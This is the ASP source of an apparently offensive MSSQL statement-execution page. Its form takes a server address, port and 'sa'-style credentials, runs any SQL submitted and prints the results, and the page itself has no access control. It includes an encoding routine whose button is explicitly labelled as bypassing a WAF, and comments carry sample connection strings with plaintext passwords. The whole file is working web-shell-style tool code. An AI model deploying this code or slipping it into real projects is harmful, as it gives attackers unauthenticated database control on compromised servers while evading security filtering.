<%
''''''''''''''''''''''
' MSSQL语句执行工具asp版 by 冰河
' blog: https://blog.csdn.net/l1028386804 
' github: https://github.com/sunshinelyz/asp_mssql_tool
'
' ASP与MSSQL 2012  企业版连接字符串
' ConnStr="Provider=SQLOLEDB;Data Source=127.0.0.1;Initial Catalog=westrac;User Id=sa;Pwd=ssddddHzx;"
' 
' ASP与MSSQL 2008 企业版连接字符串
' ConnStr="driver={SQL Server};Server=.;database=gas;uid=sa;pwd=123456"
' 
' 
' ASP与MSSQL 2005 企业版连接字符串
' connstr="driver={SQL Server};Server=.;database=site_fsb;uid=sa;pwd=123456" 
' 
' 
' ASP与MSSQL 2000 企业版连接字符串
' ConnStr="Provider=SQLOLEDB;Data Source=127.0.0.1;Initial Catalog=westrac;User Id=sa;Password=ssddddHzx;"
'
' 32位操作系统连接地址
' ConnStr="Provider = Sqloledb; User ID = " & datauser & "; Password = " & databasepsw & "; Initial Catalog = " & databasename & "; Data Source = " & dataserver & ";"
'
' 64位操作系统连接地址
' ConnStr="PROVIDER=SQLOLEDB;DATA SOURCE=" & dataserver & ";UID=" & datauser & ";PWD=" & databasepsw & ";DATABASE="& databasename &";" 
'
''''''''''''''''''''''
showcss()
Dim Sql_serverip,Sql_linkport,Sql_username,Sql_password,Sql_database,Sql_content,Sys_version,Sql_version

Sql_serverip=Trim(Request("Sql_serverip"))
Sql_linkport=Trim(Request("Sql_linkport"))
Sql_username=Trim(Request("Sql_username"))
Sql_password=Trim(Request("Sql_password"))
Sql_database=Trim(Request("Sql_database"))
Sql_content =Trim(Request("Sql_content"))
Sys_version =Trim(Request("Sys_version"))
Sql_version =Trim(Request("Sql_version"))

If Sql_linkport="" Then Sql_linkport="1433"

If Sql_serverip<>"" and Sql_linkport<>"" and Sql_username<>"" and Sql_password<>"" and Sql_content<>"" Then
	if Request("method")="encode" then
		dim sqlarr
		sqlarr = Split(Sql_content, "\")
		Sql_content = ""
		for each x in sqlarr
			if IsNumeric(x) then
			Sql_content = Sql_content & chr(cint(x))
			else
			Sql_content = Sql_content & x
			end if
		next
	end if

	Response.Write "<hr width='100%'><b>执行结果：</b><hr width='100%'>"
	Dim SQL,conn,linkStr
	SQL=Sql_content
	
	set conn=Server.createobject("adodb.connection")
	''32位数据库''
	If Sys_version = "32" Then
	
		''MSSQL 2000''
		if Sql_version = "2000" then
		
			If Len(Sql_database)=0 Then
				linkStr="Provider=SQLOLEDB;Data Source="& Sql_serverip &";Initial Catalog="& Sql_database &";User Id="& Sql_username &";Password="& Sql_password &";"
			ELSE
				linkStr="Provider=SQLOLEDB;Data Source="& Sql_serverip &";User Id="& Sql_username &";Password="& Sql_password &";"
			END If
			
		end if
			
		''MSSQL 2005''
		if Sql_version = "2005" then	
		
			If Len(Sql_database)=0 Then
				linkStr="driver={SQL Server};Server=" & Sql_serverip & "," & Sql_linkport & ";uid=" & Sql_username & ";pwd=" & Sql_password
			Else
				linkStr="driver={SQL Server};Server=" & Sql_serverip & "," & Sql_linkport & ";uid=" & Sql_username & ";pwd=" & Sql_password & ";database=" & Sql_database
			End If
			
		end if
			
		''MSSQL2008''
		if Sql_version = "2008" then
			
			If Len(Sql_database)=0 Then
				linkStr="driver={SQL Server};Server=" & Sql_serverip & ";uid=" & Sql_username & ";pwd= " & Sql_password & ";"
			Else
				linkStr="driver={SQL Server};Server=" & Sql_serverip & ";database=" & Sql_database & ";uid=" & Sql_username & ";pwd= " & Sql_password & ";"
			End If
			
		end if	
			
		''MSSQL2012''
		if Sql_version = "2012" then
		
			If Len(Sql_database)=0 Then
				linkStr="Provider = Sqloledb; User ID = " & Sql_username & "; Password = " & Sql_password & "; Data Source = " & Sql_serverip & ";"
			Else
				linkStr="Provider = Sqloledb; User ID = " & Sql_username & "; Password = " & Sql_password & "; Initial Catalog = " & Sql_database & "; Data Source = " & Sql_serverip & ";"
			End If
			
		end if
			
		
	''结束32位系统下数据库的处理''
	END If
	
	''处理64位数据库''
	If Sys_version = "64" Then
		''MSSQL 2000''
		if Sql_version = "2000" then
			If Len(Sql_database)=0 Then
				linkStr="PROVIDER=SQLOLEDB;DATA SOURCE=" & Sql_serverip & ";UID=" & Sql_username & ";PWD=" & Sql_password & ";" 
			Else
				linkStr="PROVIDER=SQLOLEDB;DATA SOURCE=" & Sql_serverip & ";UID=" & Sql_username & ";PWD=" & Sql_password & ";DATABASE="& Sql_database &";" 
			End If
			
		end if
			
		''MSSQL 2005''
		if Sql_version = "2005" then	
		
			If Len(Sql_database)=0 Then
				linkStr="PROVIDER=SQLOLEDB;DATA SOURCE=" & Sql_serverip & ";UID=" & Sql_username & ";PWD=" & Sql_password & ";" 
			Else
				linkStr="PROVIDER=SQLOLEDB;DATA SOURCE=" & Sql_serverip & ";UID=" & Sql_username & ";PWD=" & Sql_password & ";DATABASE="& Sql_database &";" 
			End If
			
		end if
		
		''MSSQL2008''
		if Sql_version = "2008" then
		
			If Len(Sql_database)=0 Then
				linkStr="PROVIDER=SQLOLEDB;DATA SOURCE=" & Sql_serverip & ";UID=" & Sql_username & ";PWD=" & Sql_password & ";" 
			Else
				linkStr="PROVIDER=SQLOLEDB;DATA SOURCE=" & Sql_serverip & ";UID=" & Sql_username & ";PWD=" & Sql_password & ";DATABASE="& Sql_database &";" 
			End If
		
		end if
			
		''MSSQL2012''
		if Sql_version = "2012" then
		
			If Len(Sql_database)=0 Then
				linkStr="PROVIDER=SQLOLEDB;DATA SOURCE=" & Sql_serverip & ";UID=" & Sql_username & ";PWD=" & Sql_password & ";" 
			Else
				linkStr="PROVIDER=SQLOLEDB;DATA SOURCE=" & Sql_serverip & ";UID=" & Sql_username & ";PWD=" & Sql_password & ";DATABASE="& Sql_database &";" 
			End If
			
		end if
		
	End If
	
	''打开数据库链接''
	conn.open linkStr
	
	' "Driver={SQL Server};SERVER=IP,端口号;UID=sa;PWD=xxxx;DATABASE=DB"
	' update [user] set [name]='admin' where uid=1
	set rs = Server.CreateObject("ADODB.recordset")
	rs.open SQL, conn
	on error resume next
		if err<>0 then
		   response.write "错误："&err.Descripting&" 数据库版本： "&Sql_version&" 系统版本： "& Sys_version&" 数据库连接： " & linkStr
		else
			response.write Replace(SQL,vbcrlf,"<br>") & " &nbsp; 成功！<br /><br />"
			dim record 
			record = rs.fields.count
			if record>0 then
			dim i
			i = 0 %>
			<table class="gridtable">  
			<tr>
			<%for each x in rs.fields
				response.write("<th style=""min-width: 80px"">" & x.name & "</th>")
			  next%>
			</tr>
			<%do until rs.EOF%>
				<tr>
			<%for each x in rs.Fields%>
			  <td><%Response.Write(x.value)%></td>
			<%next
			rs.MoveNext%>
			</tr>
			<%loop%>
			</table>
			<%
			end if
			rs.close
			conn.close
			
		end if
	Response.End
	
End If

If Request("do")<>"" Then
	Response.Write "请填写数据库连接参数"
	Response.End
End If

Sub showcss()
%>
<style>
textarea{resize:none;}
table.gridtable {
	font-family: verdana,arial,sans-serif;
	font-size:11px;
	color:#333333;
	border-width: 1px;
	border-color: #666666;
	border-collapse: collapse;
}
table.gridtable th {
	border-width: 1px;
	padding: 5px 8px;
	border-style: solid;
	border-color: #666666;
	background-color: #dedede;
}
table.gridtable td {
	border-width: 1px;
	padding: 5px 8px;
	border-style: solid;
	border-color: #666666;
	background-color: #ffffff;
}
</style>
<%
End Sub

%>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
<meta http-equiv="expires" content="Wed, 26 Feb 2006 00:00:00 GMT">
<% showcss() %>
<title>MSSQL语句执行工具asp版 by 冰河</title>
<script>
function encode(s){
	var r = "";
	for(var i = 0; i < s.length ; i++){
		var a = s.charCodeAt(i);
		if(a < 128 && a > 0){
			r += "\\" + a;
		}else{
			r += "\\" + s[i];
		}
	}
	return r;
}
</script>
</head>
<body>

<hr width="100%">

<form method="post" action="<%=Request.ServerVariables("SCRIPT_NAME")%>?do=exec" target="ResultFrame" id="submitf">
	<table class="gridtable" width="100%" style="FILTER: progid:DXImageTransform.Microsoft.Shadow(color:#f6ae56,direction:145,strength:15);">
		<tr>
		<td colspan="2" align="center">
			<h2>MSSQL语句执行工具asp版 by <a href="https://blog.csdn.net/l1028386804" target="_blank">冰河</a></h2>
		</td>
		</tr>
		<tr>
		<td>
			<table class="gridtable">
			<tr><th colspan="2" align="center">数据库连接设置</th></tr>
			<tr>
				<td width="80">系统版本:</td>
				<td>
					<select name="Sys_version" style="width:150px;">
					  <option value ="32">x86</option>
					  <option value ="64">x64</option>
					</select>
				</td>
			</tr>
			<tr>
				<td width="80">数据库版本:</td>
				<td>
					<select name="Sql_version" style="width:150px;">
					  <option value ="2000">2000</option>
					  <option value ="2005">2005</option>
					  <option value ="2008">2008</option>
					  <option value ="2012">2012</option>
					</select>
				</td>
			</tr>
			<tr><td width="80">SERVERIP:</td><td><input type="text"  value="127.0.0.1"   name="Sql_serverip"  style="width:150px;"></td></tr>
			<tr><td width="80">LINKPORT:</td><td><input type="text"  value="1433"   name="Sql_linkport"  style="width:150px;"></td></tr>
			<tr><td width="80">USERNAME:</td><td><input type="text"  value="sa"   name="Sql_username"  style="width:150px;"></td></tr>
			<tr><td width="80">PASSWORD:</td><td><input type="password" name="Sql_password"  style="width:150px;"></td></tr>
			<tr><td width="80">DATABASE:</td><td><input type="text"     name="Sql_database"  style="width:150px;"></td></tr>
			</table>
		</td>
		<td width="100%">
			<DIV align=center
			style='
			color: #990099;
			background-color: #E6E6FA;
			width: 100%;
			height: 180px;
			scrollbar-face-color: #DDA0DD;
			scrollbar-shadow-color: #3D5054;
			scrollbar-highlight-color: #C3D6DA;
			scrollbar-3dlight-color: #3D5054;
			scrollbar-darkshadow-color: #85989C;
			scrollbar-track-color: #D8BFD8;
			scrollbar-arrow-color: #E6E6FA;
			'>
			<textarea name="Sql_content" id="sqlc" style='width:100%;height:100%;'>输入你要执行的sql语句</textarea>
			</DIV>
			<input type="hidden" id="method" name="method" value="common">
			<input type="submit" value="普通执行(可能被WAF拦截)">
			<input type="button" onclick="var a=sqlc.value;method.value='encode';sqlc.value=encode(a);submitf.submit();method.value='common';sqlc.value = a;" value="编码执行(可绕过WAF)">
		</td>
		</tr>
	</table>
</form>

<hr width="100%">
<iframe name="ResultFrame" frameborder="0" width="100%" style="min-height: 300px;" src="<%=Request.ServerVariables("SCRIPT_NAME")%>?do=exec"></iframe>
</body>
</html>